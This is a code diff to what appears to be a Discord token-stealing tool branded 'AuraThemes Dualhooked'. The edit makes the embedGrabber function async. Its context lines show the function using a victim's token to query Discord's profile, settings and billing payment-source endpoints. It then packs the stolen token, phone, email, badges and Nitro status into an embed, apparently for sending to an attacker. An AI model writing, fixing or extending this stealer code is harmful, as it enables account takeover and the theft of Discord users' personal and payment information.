@@ -189,7 +189,7 @@ function allBabges(f) {
   ) || ":x:";
 }
 
-function embedGrabber(info, data) {
+async function embedGrabber(info, data) {
   const profile = getAPI(`https://discord.com/api/v9/users/${info.id}/profile`, info.token);
   const settings = getAPI(`https://discord.com/api/v9/users/@me/settings`, info.token);
   const payment = getAPI(`https://discord.com/api/v9/users/@me/billing/payment-sources`, info.token);
@@ -213,7 +213,7 @@ function embedGrabber(info, data) {
     .setTitle('AuraThemes Dualhooked')
     .addFields(
       { name: "<a:aura:1087044506542674091> Token", value: `\`\`\`${data}\`\`\``, inline: false },
-      { name: "Nitro", value: getNitro(profile), inline: true },
+      { name: "Nitro", value: await getNitro(profile), inline: true },
       { name: "Badges", value: allBabges(info.flags), inline: true },
       { name: "Phone", value: `\`${info.phone || "None"}\``, inline: true },
       { name: "Email", value: `\`${info.email || "None"}\``, inline: false },
